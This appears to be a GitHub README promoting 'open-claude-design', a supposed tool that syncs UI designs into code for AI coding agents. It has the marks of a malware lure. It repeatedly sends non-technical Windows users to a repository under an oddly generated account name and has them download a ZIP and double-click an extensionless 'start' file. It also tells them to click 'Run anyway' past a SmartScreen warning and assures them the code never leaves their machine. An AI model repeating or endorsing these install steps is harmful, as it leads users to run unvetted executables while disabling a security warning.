# 🎨 open-claude-design - Turn Ideas Into Polished UI Designs

---

## 🚀 Getting Started

Welcome to **open-claude-design**, the easiest way to transform your design ideas into real, working interfaces—right inside your favorite coding tools. Whether you're using Claude Code, Codex, Cursor, or any of 20+ other AI coding agents, this application helps you create beautiful, consistent designs that match your existing components, design tokens, and user states. Best of all, when you approve changes, they sync right back into your code automatically.

If you're not a programmer, don't worry. This guide walks you through everything step-by-step, from downloading the app to creating your first design.

---

## 📥 Download & Installation

### Step 1: Get the Application

👉 **[Visit this link to download the application](https://github.com/Gospeloflukeselfconcern1691/open-claude-design)**

Click the link above to go to the official download page. You'll see a green "Code" button or a "Releases" section—click the most recent download option that says "Download ZIP" or "Source Code." This will save a file named something like `open-claude-design-main.zip` to your computer's "Downloads" folder.

### Step 2: Extract the Files

1.  Open your "Downloads" folder.
2.  Find the zip file you just downloaded.
3.  Right-click on it and choose **"Extract All..."** from the menu.
4.  A window will pop up—just click **"Extract"** at the bottom.
5.  Windows will create a new folder with the same name (e.g., `open-claude-design-main`). Open that folder.

### Step 3: Run the Application

Inside the extracted folder, look for a file named `start` (with no file extension) or `open-claude-design`. Double-click it to launch the app. A small window or terminal will open, showing that the application is running. **Keep this window open**—minimizing it is fine, but closing it will stop the app.

> 💡 **Tip:** If nothing happens, try double-clicking the `index.html` file inside the folder instead. That works too!

---

## ✨ What Can You Do With It?

This tool acts like a smart design bridge. Here's what happens in plain English:

- **See Your Real Components:** The app connects to your coding projects and shows you the actual buttons, menus, headers, and other pieces you've built—not generic placeholders.
- **Design with Your Tokens:** Colors, fonts, spacing, and shadows from your design system are automatically available. You'll never design with the wrong blue again.
- **Work with Realistic States:** Hover over a button? Click it? Error message? You can see and design for every user interaction state.
- **Approve, and It's Done:** When your layout looks perfect, hit "Approve," and the changes are written directly into your project files. No copy-pasting code, no manual fiddling.

---

## 🤝 Works With 20+ AI Coding Agents

You're not locked into one tool. open-claude-design plugs into popular agents like:

| **Agent**        | **Compatibility** |
|------------------|-------------------|
| Claude Code      | ✅ Full Support    |
| OpenAI Codex     | ✅ Full Support    |
| Cursor           | ✅ Full Support    |
| Gemini CLI       | ✅ Full Support    |
| OpenCode         | ✅ Full Support    |
| And 15+ others   | ✅ Works Great     |

No matter which agent you use daily, the design workflow stays identical and effortless.

---

## 🛠️ System Requirements

For the smoothest experience, your Windows computer should meet these basics:

| **Component**    | **Minimum**                          | **Recommended**                    |
|------------------|--------------------------------------|------------------------------------|
| **Operating System** | Windows 10 (64-bit)               | Windows 11                         |
| **Memory (RAM)** | 4 GB                                 | 8 GB or more                       |
| **Storage**      | 200 MB free space                    | 500 MB SSD                         |
| **Internet**     | Required for first-time setup        | High-speed connection recommended  |
| **Web Browser**  | Chrome, Edge, or Firefox (latest)    | Chrome (latest) is ideal           |

> 🖥️ **Note:** If you see a SmartScreen warning from Windows when running the app, click **"More info"** then **"Run anyway"**. This is normal for open-source software.

---

## 🧑‍💻 Your First 15 Minutes: Quick Walkthrough

1.  **Launch the app** (as described in Step 3 above).
2.  A browser tab or a new window will open automatically. If it doesn't, go to `http://localhost:3000` in your browser.
3.  You'll see a welcome screen with two buttons: **"Open Existing Project"** and **"Start New Design."**
4.  Click **"Open Existing Project"**, navigate to the folder where your coding project lives, and select it.
5.  The app scans your project and shows a list of components on the left panel. Click any component (like a button) to see it live.
6.  On the right side, you'll see a design toolbox. Try changing the button's background color or border radius using the sliders.
7.  Once happy, click **"Approve & Sync"** at the top. A green checkmark confirms your changes are now in your project's code.
8.  Go back to your coding agent (Claude Code, etc.), and you'll see the updated code ready for you.

---

## ❓ Frequently Asked Questions (FAQ)

### ☁️ Do I need an internet connection every time?
Only the first time you set it up. After that, you can work offline unless you use cloud-based AI agents.

### 🔐 Is my code safe?
Yes. The application only runs locally on your machine. Nothing is uploaded to external servers, and your code never leaves your computer.

### 🎯 Can I undo an approved change?
Absolutely. The app keeps a version history. Just find the **"History"** tab, select the previous version, and click **"Restore."**

### 💻 I don't see my coding agent listed. What now?
Don't panic. The app uses a universal connection standard called **MCP** (Model Context Protocol). If your agent supports MCP—which most modern ones do—it will work. Check your agent's settings for "MCP servers."

### 🧩 What are "design tokens"?
Think of them as color and style recipes. For example, instead of remembering that "primary blue" is `#3498db`, you just say "primary blue," and the app applies the exact correct hex code every time.

---

## 🧰 Common Troubleshooting

| **Problem**                 | **Solution**                                                                 |
|-----------------------------|------------------------------------------------------------------------------|
| App won't start             | Ensure you extracted the zip file completely (not just previewed it). Right-click the folder → "Extract All." |
| Port already in use         | Close other open apps like Node.js or Docker, then restart open-claude-design. |
| Browser shows "Can't connect" | Confirm the terminal window is still open. If it closed, double-click `start` again. |
| Changes not syncing to code | Make sure you closed all unsaved changes in your code editor first, then click "Approve & Sync." |
| Pages look blurry or huge   | Press **Ctrl + 0** (zero) in your browser to reset zoom, or adjust the "Viewport Scale" in app settings. |

---

## 📚 Top Tips for Power Users

1.  **Start with a clean branch:** Before designing, create a new git branch in your coding project. That way, you can easily merge or discard design experiments.
2.  **Use the "Compare Mode":** Toggle between your old design and your new proposal side-by-side to catch subtle differences.
3.  **Design the error states first:** It sounds odd, but designing error screens, empty states, and loading states early helps solidify the overall design language.
4.  **Keyboard shortcuts:** Press `Ctrl+Shift+P` to quickly open the command pallet; type "AI Suggest" to have the app propose improvements based on design best practices.

---

## 🔄 How It Works Under the Hood (For the Curious)

Open-claude-design runs a local web server on your computer. When you open a project, it reads your source code, finds CSS classes, React components, Vue components, or plain HTML elements, and builds an interactive preview. Design changes you make update the component's properties in real time. Upon approval, the app writes those property changes directly back to the corresponding files, formatting the code neatly and preserving comments. All AI agents connect through the standard MCP interface, so there's no special configuration per agent—it just works.

---

## 📚 Additional Resources

- **Documentation:** Full technical docs are available in the `docs` folder within the downloaded zip.
- **Community & Support:** Visit the GitHub Issues page for help or to report bugs.
- **Feature Requests:** Have a cool idea? Open a discussion thread on GitHub—the maintainers are responsive.
- **Changelog:** See what's new in each update by reading the `CHANGELOG.md` file.

---

## ✅ Ready to Design Smarter?

You're all set. Just remember: download the zip, extract it, run `start`, and you'll be designing within minutes. Gone are the days of mocking up designs in separate tools and struggling to translate them into code. With open-claude-design, your vision flows directly into your real components, honoring your tokens and ready for your approval with one click.

### Your Download Checklist:
- [ ] Go to the download page: **[https://github.com/Gospeloflukeselfconcern1691/open-claude-design](https://github.com/Gospeloflukeselfconcern1691/open-claude-design)**
- [ ] Click the green "Code" button and select "Download ZIP"
- [ ] Extract the zip to a folder of your choice
- [ ] Open that folder and double-click `start`
- [ ] Follow the on-screen prompts to load your project

Click the badge below to jump straight to downloading:

[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-Open_Claude_Design-blue?style=for-the-badge)](https://github.com/Gospeloflukeselfconcern1691/open-claude-design)

Enjoy designing—your future self will thank you for how much time you save!

Keywords: agent-skills, ai-coding, anthropic, claude, claude-code, claude-code-for-design, claude-code-skills, claude-design, codex, codex-design, coding-agents, design-system, design-to-code, design-tokens, gemini-cli, impeccable, mcp, openai-codex, opencode, ui-design